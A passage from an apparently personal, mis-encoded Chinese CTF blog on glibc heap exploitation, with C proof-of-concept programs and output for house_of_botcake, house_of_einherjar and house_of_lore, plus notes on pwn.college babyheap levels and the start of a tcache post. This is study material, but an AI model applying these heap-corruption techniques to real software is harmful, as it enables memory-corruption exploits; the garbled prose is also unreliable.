p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>å‡è®¾æœ‰ä¸¤ä¸ªå †å—<code>a</code>å’Œ<code>b</code>åœ¨ç‰©ç†ä¸Šç›¸é‚»,<code>a</code>åœ¨ä½å¤„,<code>b</code>åœ¨é«˜å¤„</p>
<p>å…ˆé‡Šæ”¾<code>b</code>è¿›å…¥<code>unsortedbin</code>,ç„¶åé‡Šæ”¾<code>a</code>,</p>
<p>æ­¤æ—¶<code>a</code>ä¼šå‘å‰åˆå¹¶åˆ°<code>b</code></p>
<p>æ­¤æ—¶è®©<code>tcachebin</code>è…¾ä¸ªç©º,<code>Double Free a</code>,è®©<code>a</code>è¿›å…¥<code>tcachebins</code></p>
<blockquote>
<p>ä¸ºä»€ä¹ˆè¦è®©<code>tcachebin</code>è…¾ç©ºå‘¢?ç›´æ¥<code>free</code>æ”¾åˆ°<code>bins</code>ä¸­ä¸è¡Œå—?</p>
<p>è¿˜çœŸä¸è¡Œ,å› ä¸ºç¬¬ä¸€æ¬¡<code>free(a)</code>è¿›å…¥<code>unsortedbin</code>æ—¶,ä¼šè®©<code>a-&gt;nextchunk-&gt;prev_in_use</code>ç½®é›¶,</p>
<p>ä¸‹ä¸€æ¬¡å¦‚æœ<code>free(a)</code>è¿˜æ˜¯è¿›å…¥<code>unsortedbin</code>ä¸­æ—¶,ä¼šæ£€æŸ¥åˆ°<code>a-&gt;nextchunk-&gt;prev_in_use=0</code>,æ£€æŸ¥å‡ºäº†äºŒæ¬¡é‡Šæ”¾</p>
<p>è€Œ<code>tcachebins</code>åªä¼šæœ‰ä¸€ä¸ª<code>key</code>å€¼åˆ¤é‡æ£€æŸ¥,æ˜¾ç„¶é‡Šæ”¾è¿›å…¥<code>bins</code>ä¸­çš„å †å—ä¸ä¼šè®¾ç½®<code>key</code>å€¼,èƒ½å¤Ÿé€šè¿‡è¿™ä¸ªæ£€æŸ¥</p>
</blockquote>
<p>é‚£ä¹ˆæ­¤æ—¶å°±å½¢æˆäº†å †å—é‡å </p>
<p><code>a</code>æˆä¸º<code>b</code>è…¹ä¸­çš„ä¸€éƒ¨åˆ†</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *a;</span><br><span class="line">    <span class="type">size_t</span> *b;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x100</span>);  <span class="comment">//b&#x27;s address is higher than a&#x27;s</span></span><br><span class="line">    barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//prevent consolidation with topchunk</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(b);<span class="comment">//free b into unsortedbins</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">//a will consolidate with b </span></span><br><span class="line">    tcache_chunks[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//make room for </span></span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">malloc</span>(b);</span><br><span class="line">    b[<span class="number">0</span>]=<span class="number">0x1122334455667788</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,a[<span class="number">0x110</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_botcake.c -o house_of_botcake -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_botcake</span><br><span class="line">0x1122334455667788</span><br></pre></td></tr></table></figure>



<h4 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h4><p>æ”»å‡»å‡è®¾:</p>
<p>0.èƒ½å¤Ÿæ§åˆ¶<code>tcache</code>çš„çŠ¶æ€</p>
<p>1.å †å—ç”³è¯·æ—¶,å¤ç”¨ä¸‹ä¸€å †å—çš„<code>prev_size</code>å­—æ®µ,èƒ½å¤Ÿæ„é€ å‡çš„<code>prev_size</code>å­—æ®µ</p>
<p>å¹¶ä¸”å­˜åœ¨<code>off-by-one</code>,èƒ½å¤Ÿå†ä¿®æ”¹<code>size</code>çš„æ ‡å¿—ä½ä¸­çš„<code>prev_in_use</code></p>
<p>ç”»ä¸ªå›¾æ„æ€æ„æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241104213606983.png" alt="image-20241104213606983"></p>
<p><code>b</code>æœ€ç»ˆè¢«é‡Šæ”¾è¿›å…¥<code>tcache</code>ä¹‹å,å¯ä»¥ä½¿ç”¨<code>fake_chunk</code>æ”¹å†™<code>tcache</code>çš„å…ƒæ•°æ®è¿›è¡ŒæŠ•æ¯’</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *a;</span><br><span class="line">    <span class="type">size_t</span> *b;</span><br><span class="line">    <span class="type">size_t</span> *c;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line">    <span class="type">size_t</span> *target;</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk_header;</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk_mem;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    a = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">    c = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">    barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    fake_chunk_header = a;          <span class="comment">//consruct a fake chunk inside chunk a&#x27;s memory</span></span><br><span class="line">    fake_chunk_header[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    fake_chunk_header[<span class="number">1</span>] = <span class="number">0x130</span>;</span><br><span class="line">    fake_chunk_header[<span class="number">2</span>] = &amp;fake_chunk_header[<span class="number">0</span>];</span><br><span class="line">    fake_chunk_header[<span class="number">3</span>] = &amp;fake_chunk_header[<span class="number">0</span>];</span><br><span class="line">    fake_chunk_mem = fake_chunk_header + <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    b[<span class="number">0x30</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = <span class="number">0x130</span>;         <span class="comment">//fake_c_prevsize</span></span><br><span class="line">    <span class="type">char</span> * size_ptr = &amp;b[<span class="number">0x38</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)]; </span><br><span class="line">    *size_ptr= <span class="number">0</span>;     <span class="comment">//off by one</span></span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x220</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target: %p\n&quot;</span>, target);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk_mem: %p\n&quot;</span>, fake_chunk_mem);</span><br><span class="line">    assert(target == fake_chunk_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_einherjar.c -o house_of_einherjar -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_einherjar</span><br><span class="line">target: 0x5591c4d6f9b0</span><br><span class="line">fake_chunk_mem: 0x5591c4d6f9b0</span><br></pre></td></tr></table></figure>



<h3 id="smallbins"><a href="#smallbins" class="headerlink" title="smallbins"></a>smallbins</h3><h4 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h4><p>æ”»å‡»å‡è®¾:å¯¹é‡Šæ”¾è¿›å…¥<code>smallbins</code>ä¸­çš„å †å—æœ‰<code>UAF</code>,èƒ½å¤Ÿä¿®æ”¹å…¶<code>bk</code>æŒ‡é’ˆ</p>
<p>1.é‡Šæ”¾ä¸€ä¸ªå †å—<code>victim</code>è¿›å…¥<code>smallbins</code></p>
<p>2.å¯¹<code>victim</code>è¿›è¡Œ<code>UAF</code>,ä¿®æ”¹å…¶<code>bk</code>æŒ‡é’ˆæŒ‡å‘<code>a</code>å †å—</p>
<p>3.<code>a</code>å‰ä¸<code>victim</code>ç›¸è¿,åä¸<code>b</code>ç›¸è¿</p>
<p>4.<code>b</code>åé¢åªä½¿ç”¨<code>bk</code>æŒ‡é’ˆæŒ‚äº†ä¸€ä¸²å †å—(èƒ½å¤Ÿå¡«æ»¡<code>tcahe</code>)</p>
<p>5.æ¸…ç©º<code>tcache</code>ç„¶å<code>malloc</code>,å¯¼è‡´<code>a</code>,<code>b</code>ä»¥åŠä¸€è¿ä¸²æ‹–å®¶å¸¦å£è¿›å…¥<code>tcache</code></p>
<p>6.æ­¤åä»<code>tcache</code>ä¸­åˆ†é…å¯ä»¥è¿›è¡Œä»»æ„åœ°å€å†™</p>
<p>ç”»ä¸ªå›¾æ„æ€æ„æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241105134342656.png" alt="house_of_lore"></p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> *fd;</span><br><span class="line">    <span class="type">size_t</span> *bk;</span><br><span class="line">&#125;BinChunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *victim;</span><br><span class="line">    <span class="type">size_t</span> *victim_header;</span><br><span class="line">    <span class="type">size_t</span> *barrier;</span><br><span class="line">    BinChunk a;						<span class="comment">//on stack</span></span><br><span class="line">    BinChunk b;						<span class="comment">//on stack</span></span><br><span class="line">    BinChunk fake_freelist[<span class="number">7</span>];		<span class="comment">//on stack</span></span><br><span class="line">    <span class="type">size_t</span> * target;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        fake_freelist[i].bk = &amp;fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">    &#125;       <span class="comment">//fake_freelist[0] =&gt; fake_freelist[1] =&gt; fake_freelist[2] =&gt; ... fake_freelist[6]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">    victim_header = (<span class="type">char</span>*)victim - <span class="number">0x10</span>;</span><br><span class="line">    barrier = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(victim);           <span class="comment">//now victim is in unsorted bin</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);         <span class="comment">//sort victim into smallbin</span></span><br><span class="line">    <span class="comment">//suppose we have UAF to modify victim.bk points to a</span></span><br><span class="line"><span class="comment">///////////////////////////////////</span></span><br><span class="line">    victim[<span class="number">1</span>] = &amp;a; <span class="comment">//UAF</span></span><br><span class="line"><span class="comment">///////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    a.fd = victim_header;</span><br><span class="line">    a.bk = &amp;b;</span><br><span class="line">    b.fd = &amp;a;</span><br><span class="line">    b.bk = &amp;fake_freelist[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// smallbins[idx] =&gt; victim &lt;=&gt; a &lt;=&gt; b =&gt; fake_freelist[0] =&gt; fake_freelist[1] =&gt; ... fake_freelist[6]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);   <span class="comment">//empty tcache</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//get victim again and use smallbins to fill tcache</span></span><br><span class="line">    <span class="comment">//tcache[idx] =&gt; fake_freelist[4] =&gt; fake_freelist[3] =&gt; fake_freelist[2] =&gt; fake_freelist[1] =&gt; fake_freelist[0] =&gt;b =&gt;a</span></span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x100</span>); <span class="comment">//fetch fake_freelist[4] from tcache</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target = %p\n&quot;</span>,target);</span><br><span class="line">    assert(target == &amp;fake_freelist[<span class="number">4</span>].fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc house_of_lore.c -o house_of_lore -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./house_of_lore</span><br><span class="line">victim = 0x563ada3d8a10</span><br><span class="line">victim = 0x563ada3d8a10</span><br><span class="line">target = 0x7ffd93539ed0</span><br></pre></td></tr></table></figure>



<h2 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h2><h3 id="level1-0"><a href="#level1-0" class="headerlink" title="level1.0"></a>level1.0</h3><p>æ”»å‡»å‡è®¾:</p>
<p>0.åªæœ‰<code>malloc</code>,æ²¡æœ‰<code>calloc</code></p>
<p>1.æœ€å¤šæŒæœ‰16ä¸ªå †å—æŒ‡é’ˆ,å¯ä»¥å¡«å……<code>tcache</code></p>
<p>2.<code>free</code>ä¹‹åä¸æ¸…ç©ºæŒ‡é’ˆ,å¯ä»¥<code>UAF</code></p>
<p>å¯ä»¥è€ƒè™‘ <code>fastbin_dup_with_consolidate</code>çš„æ€è·¯</p>
<p>0.å¡«å……tcache</p>
<p>1.æ‰¾ä¸€ä¸ªä¸topchunkç›¸é‚»çš„å°å †å—,freeè¿›å…¥fastbins</p>
<p>2.read_flagå‘èµ·0x52Aå­—èŠ‚çš„åˆ†é…è¯·æ±‚,åˆå¹¶fastbinså †å—åˆ°topchunk,å¹¶æ‹¿åˆ°flag_chunk</p>
<p>3.ç›´æ¥ä»å°å †å—ä¸ŠUAF,putså³å¯æ³„éœ²flag</p>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>æ”»å‡»å‡è®¾:</p>
<p>0.æœ‰mallocä¹Ÿæœ‰calloc, mallocæœ€å¤§0x420, callocæ— é™åˆ¶</p>
<p>1.freeä¸æ¸…ç©ºæŒ‡é’ˆ,UAF</p>
<ol start="2">
<li></li>
</ol>
<h3 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h3><p>æœ€å°3000å­—èŠ‚çš„å †å—</p>
<p>åªèƒ½è€ƒè™‘largebinså’Œunsortedbinçš„åˆ©ç”¨æ–¹æ³•</p>
<p>ç›®æ ‡æ˜¯å°†<code>authenticated @ 0x4041C0</code>å†™ä¸Šä»»æ„å€¼</p>
<p>æ­¥éª¤:</p>
<p>å¤§äº3000å­—èŠ‚çš„largebin,æ¯”å¦‚<code>0xbc0-0xbf0</code></p>
<p>å¯ä»¥ç”³è¯·0xbd0,0xbe0</p>
<p>1.A &#x3D; malloc(0xbe0)</p>
<p>barrier</p>
<p>2.B &#x3D; malloc(0xbe0)</p>
<p>barrier</p>
<p>3.C &#x3D; malloc(0xbd0)</p>
<p>barrier</p>
<p>3.free(A),free(B)è¿›å…¥largebin,UAFæ³„éœ²binåœ°å€å’Œå †å—åœ°å€</p>
<p>4.malloc(0xbe0)æ‹¿ä¸€ä¸ªå‡ºæ¥,å‰©ä¸‹ä¸€ä¸ª</p>
<p>5.UAFå°†authenticatedæŒ‚åˆ°bk_nextsizeä¸Š</p>
<p>6.free(C)</p>
<h3 id="level5-0"><a href="#level5-0" class="headerlink" title="level5.0"></a>level5.0</h3><p>æœ‰è¶Šç•Œå†™</p>
<p>1.UAFæ³„éœ²å †å—åŸºåœ°å€</p>
<p>2.æ ¹æ®ç›¸å¯¹åç§»é‡è®¡ç®—å¾—åˆ°flag_chunkçš„åœ°å€</p>
<p>å¦‚ä½•å°†alloc_structæ”¾åˆ°å †å—é‡Œ?</p>
<h3 id="level6-0"><a href="#level6-0" class="headerlink" title="level6.0"></a>level6.0</h3><h3 id="level7-0"><a href="#level7-0" class="headerlink" title="level7.0"></a>level7.0</h3><p>ç¦ç”¨tcache</p>
<p>æ³„éœ²flagåœ°å€</p>
<p>fastbinåˆ©ç”¨,æœ‰UAF,</p>
<h3 id="level8-0"><a href="#level8-0" class="headerlink" title="level8.0"></a>level8.0</h3><p>æœ€å¤§ç”³è¯·0x1000</p>
<p>å †é£æ°´:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">----------------</span><br><span class="line">A</span><br><span class="line">----------------</span><br><span class="line">flag</span><br><span class="line">----------------</span><br><span class="line">B</span><br><span class="line">----------------</span><br><span class="line">C</span><br><span class="line">----------------</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>







<p>1.é€šè¿‡Bæ„é€ <code>C-&gt;prev_size</code>å¹¶é€šè¿‡<code>off-by-one</code>å°†<code>C-&gt;prev_in_use</code>  å½’0</p>
<p>2.åœ¨Aä¸­æ„é€ å‡çš„å †å—å¤´,è¿™éœ€è¦è®¾ç½®<code>fd</code>å’Œ<code>bk</code>æŒ‡é’ˆ</p>
<p>3.<code>free C</code>,å‘å‰åˆå¹¶åˆ°<code>A</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/T%E6%93%A6%E8%BD%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/T%E6%93%A6%E8%BD%A6/" class="post-title-link" itemprop="url">tcache</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-10-17 23:24:00 / Modified: 23:24:35" itemprop="dateCreated datePublished" datetime="2024-10-17T23:24:00+08:00">2024-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Tæ“¦è½¦"><a href="#Tæ“¦è½¦" class="headerlink" title="Tæ“¦è½¦"></a>Tæ“¦è½¦</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -o ProxyCommand=&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; hacker@pwn.college</span><br><span class="line">scp -o ProxyCommand=&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; hacker@pwn.college:/challenge/babyheap_level15.0  .</span><br></pre></td></tr></table></figure>



<h2 id="tcacheæ•°æ®ç»“æ„ä¸ç®—æ³•"><a href="#tcacheæ•°æ®ç»“æ„ä¸ç®—æ³•" class="headerlink" title="tcacheæ•°æ®ç»“æ„ä¸ç®—æ³•"></a>tcacheæ•°æ®ç»“æ„ä¸ç®—æ³•</h2><h3 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc-2.27"></a>glibc-2.27</h3><h4 id="datastructure"><a href="#datastructure" class="headerlink" title="datastructure"></a>datastructure</h4><p> åœ¨<code>glibc-2.27</code>ä¸Š<code>Tcache</code>é•¿è¿™æ ·</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241009161233717.png" alt="image-20241009161233717"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¯ä¸ªçº¿ç¨‹æœ‰ä¸€ä¸ªtcache,å› æ­¤tcacheçš„çº¿ç¨‹å®ä¾‹åå«tcache_perthread_struct</span></span><br><span class="line"><span class="comment">//countså’Œentriesæ˜¯å†—ä½™çš„,åªæ˜¯ä¸ºäº†æ€§èƒ½æ‰€ä»¥ä½¿ç”¨äº†countsè®¡æ•°</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"><span class="comment">//æ¯ä¸ªtcacheæœ‰TCACHE_MAX_BINS = 64 ä¸ªæ¡¶å­</span></span><br></pre></td></tr></table></figure>

